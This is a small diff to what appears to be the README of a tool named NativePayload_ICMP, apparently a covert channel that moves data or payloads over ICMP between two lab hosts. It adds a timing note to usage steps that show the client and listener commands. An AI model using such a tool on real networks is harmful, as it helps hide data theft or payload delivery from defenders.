@@ -38,3 +38,6 @@ step 1 (client side with IPv4 192.168.56.10): ./NativePayload_ICMP.sh  shtext  "
 
 step 1-2 (server side with IPv4 192.168.56.13) : NativePayload_ICMP.exe  listen  192.168.56.10
 
+Note: you should execute "step1-2" , immediately after 2 or 3 seconds.
+
+
